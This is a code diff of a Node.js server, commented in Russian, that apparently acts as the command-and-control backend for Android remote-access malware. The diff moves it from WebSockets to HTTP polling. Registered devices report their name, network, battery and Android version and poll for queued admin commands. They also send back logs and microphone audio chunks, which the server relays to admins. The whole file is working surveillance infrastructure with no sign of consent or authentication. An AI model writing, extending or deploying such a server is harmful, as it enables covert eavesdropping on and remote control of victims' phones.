@@ -1,103 +1,192 @@
 const http = require('http');
-const { WebSocketServer } = require('ws');
+const url = require('url');
+
 const PORT = process.env.PORT || 10000;
 
-const server = http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('ok');
-});
-const wss = new WebSocketServer({ server });
+// deviceId -> { name, network, battery, android, lastSeen, queue: [] }
 const clients = new Map();
-const admins = new Set();
 
-function safeSend(ws, data) {
-    try { if (ws && ws.readyState === 1) ws.send(typeof data === 'string' ? data : JSON.stringify(data)); } catch (e) {}
-}
-function broadcastAdmins(obj) { const s = JSON.stringify(obj); for (const a of admins) safeSend(a, s); }
-function sendDevicesList(ws) {
-    const list = [];
-    for (const [id, c] of clients) list.push({ id, name: c.name || 'Unknown', network: c.network || '', battery: c.battery || 0, android: c.android || '', online: c.online !== false, lastSeen: c.lastSeen || Date.now() });
-    safeSend(ws, { type: 'devices', devices: list });
-}
+// adminId -> { lastSeen, queue: [] }
+const admins = new Map();
 
-wss.on('connection', (ws) => {
-    let role = null, clientId = null;
-    ws.on('message', (raw) => {
-        let msg; try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
-        const t = msg.type;
-
-        if (t === 'register_client') {
-            role = 'client'; clientId = msg.deviceId || 'unknown';
-            const existing = clients.get(clientId) || { name: '', network: '', battery: 0, android: '', lastSeen: Date.now() };
-            existing.ws = ws; existing.online = true; existing.lastSeen = Date.now();
-            clients.set(clientId, existing);
-            console.log('[+] client online: ' + clientId);
-            broadcastAdmins({ type: 'client_online', deviceId: clientId });
-            safeSend(ws, { type: 'welcome', deviceId: clientId });
-            return;
-        }
-        if (t === 'register_admin') {
-            role = 'admin'; admins.add(ws);
-            console.log('[+] admin online');
-            sendDevicesList(ws);
-            return;
-        }
-        if (t === 'ping' || t === 'pong' || t === 'admin_ping' || t === 'server_ping') return;
-        if (t === 'status' && role === 'client') {
-            const c = clients.get(clientId);
-            if (c) {
-                c.name = msg.name || c.name;
-                c.network = msg.network || c.network;
-                c.battery = typeof msg.battery === 'number' ? msg.battery : c.battery;
-                c.android = msg.android || c.android;
-                c.lastSeen = Date.now(); c.online = true;
-            }
-            broadcastAdmins({ type: 'status', deviceId: clientId,
-                name: c ? c.name : '', network: c ? c.network : '',
-                battery: c ? c.battery : 0, android: c ? c.android : '', online: true });
-            return;
-        }
-        if (t === 'volume' && role === 'client') {
-            broadcastAdmins({ type: 'volume', deviceId: clientId, value: msg.value || 0 });
-            return;
-        }
-        if (t === 'log' && role === 'client') {
-            broadcastAdmins({ type: 'log', deviceId: clientId, message: msg.message || '', ts: Date.now() });
-            return;
-        }
-        if (t === 'mic_chunk' && role === 'client') {
-            broadcastAdmins(msg); return;
-        }
-        if (t === 'command' && role === 'admin') {
-            const target = msg.deviceId, cmd = msg.cmd, payload = msg.payload || {};
-            console.log('[cmd] ' + target + ' <- ' + cmd);
-            const c = clients.get(target);
-            if (c && c.ws && c.ws.readyState === 1) {
-                safeSend(c.ws, { type: 'command', cmd, payload, ts: Date.now() });
-                safeSend(ws, { type: 'ack', deviceId: target, ok: true });
-            } else {
-                safeSend(ws, { type: 'ack', deviceId: target, ok: false, error: 'offline' });
-            }
-            return;
-        }
+function send(res, code, obj) {
+    res.writeHead(code, {
+        'Content-Type': 'application/json',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type'
     });
-    ws.on('close', () => {
-        if (role === 'client' && clientId) {
-            const c = clients.get(clientId);
-            if (c) { c.online = false; c.ws = null; c.lastSeen = Date.now(); }
-            console.log('[-] client offline: ' + clientId);
-            broadcastAdmins({ type: 'client_offline', deviceId: clientId });
-        } else if (role === 'admin') admins.delete(ws);
+    res.end(JSON.stringify(obj));
+}
+
+function readBody(req) {
+    return new Promise((resolve) => {
+        let data = '';
+        req.on('data', c => data += c);
+        req.on('end', () => {
+            try { resolve(JSON.parse(data || '{}')); }
+            catch (e) { resolve({}); }
+        });
     });
+}
+
+const server = http.createServer(async (req, res) => {
+    if (req.method === 'OPTIONS') return send(res, 200, { ok: true });
+
+    const parsed = url.parse(req.url, true);
+    const path = parsed.pathname;
+    const q = parsed.query;
+
+    if (path === '/' || path === '/health') {
+        return send(res, 200, { ok: true, time: Date.now() });
+    }
+
+    // === РЕГИСТРАЦИЯ ===
+    if (path === '/register') {
+        const body = await readBody(req);
+        const role = body.role || 'client';
+        const id = body.deviceId || 'unknown';
+
+        if (role === 'admin') {
+            admins.set(id, { lastSeen: Date.now(), queue: [] });
+            console.log('[+] admin online: ' + id);
+        } else {
+            const existing = clients.get(id) || {};
+            clients.set(id, {
+                name: body.name || existing.name || '',
+                network: body.network || existing.network || '',
+                battery: body.battery || existing.battery || 0,
+                android: body.android || existing.android || '',
+                lastSeen: Date.now(),
+                queue: existing.queue || []
+            });
+            console.log('[+] client online: ' + id);
+        }
+        return send(res, 200, { ok: true });
+    }
+
+    // === ОПРОС ===
+    if (path === '/poll') {
+        const role = q.role || 'client';
+        const id = q.id || 'unknown';
+
+        if (role === 'admin') {
+            // Админу — список устройств
+            const devices = [];
+            for (const [did, c] of clients) {
+                devices.push({
+                    id: did,
+                    name: c.name,
+                    network: c.network,
+                    battery: c.battery,
+                    android: c.android,
+                    online: Date.now() - c.lastSeen < 20000,
+                    lastSeen: c.lastSeen
+                });
+            }
+            const adminData = admins.get(id);
+            const adminQueue = adminData ? adminData.queue : [];
+            if (adminData) adminData.queue = [];
+            if (adminData) adminData.lastSeen = Date.now();
+
+            return send(res, 200, {
+                ok: true,
+                devices: devices,
+                queue: adminQueue
+            });
+        }
+
+        // Клиенту — очередь команд
+        const c = clients.get(id);
+        if (!c) {
+            return send(res, 200, { ok: false, reason: 'not_registered', queue: [] });
+        }
+        c.lastSeen = Date.now();
+        const queue = c.queue;
+        c.queue = [];
+        return send(res, 200, { ok: true, queue: queue });
+    }
+
+    // === ОТПРАВКА КОМАНДЫ (от админа) ===
+    if (path === '/send') {
+        const body = await readBody(req);
+        const target = body.target;
+        const cmd = body.cmd;
+        const payload = body.payload || {};
+
+        const c = clients.get(target);
+        if (!c) return send(res, 404, { ok: false, error: 'offline' });
+        c.queue.push({ cmd, payload, ts: Date.now() });
+        console.log('[cmd] ' + target + ' <- ' + cmd);
+        return send(res, 200, { ok: true });
+    }
+
+    // === СОБЫТИЯ ОТ КЛИЕНТА ===
+    if (path === '/event') {
+        const body = await readBody(req);
+        const id = body.deviceId || q.id || 'unknown';
+        const t = body.type || '';
+
+        const c = clients.get(id) || { queue: [] };
+        c.lastSeen = Date.now();
+
+        if (t === 'status') {
+            c.name = body.name || c.name;
+            c.network = body.network || c.network;
+            c.battery = typeof body.battery === 'number' ? body.battery : c.battery;
+            c.android = body.android || c.android;
+        } else if (t === 'log') {
+            // Логи кидаем в очередь админов
+            for (const [, a] of admins) {
+                a.queue.push({
+                    type: 'log',
+                    deviceId: id,
+                    message: body.message || '',
+                    ts: Date.now()
+                });
+            }
+        } else if (t === 'volume') {
+            for (const [, a] of admins) {
+                a.queue.push({
+                    type: 'volume',
+                    deviceId: id,
+                    value: body.value || 0,
+                    ts: Date.now()
+                });
+            }
+        } else if (t === 'mic_chunk') {
+            for (const [, a] of admins) {
+                a.queue.push({
+                    type: 'mic_chunk',
+                    deviceId: id,
+                    data: body.data || '',
+                    ts: Date.now()
+                });
+            }
+        }
+
+        clients.set(id, c);
+        return send(res, 200, { ok: true });
+    }
+
+    send(res, 404, { ok: false });
 });
 
+// Очистка старых
 setInterval(() => {
     const now = Date.now();
-    const ping = JSON.stringify({ type: 'server_ping', ts: now });
     for (const [id, c] of clients) {
-        if (c.ws && c.ws.readyState === 1) safeSend(c.ws, ping);
+        if (now - c.lastSeen > 120000) {
+            clients.delete(id);
+            console.log('[-] client removed: ' + id);
+        }
     }
-    for (const a of admins) safeSend(a, ping);
-}, 10000);
+    for (const [id, a] of admins) {
+        if (now - a.lastSeen > 120000) {
+            admins.delete(id);
+            console.log('[-] admin removed: ' + id);
+        }
+    }
+}, 30000);
 
 server.listen(PORT, () => console.log('Server on port ' + PORT));
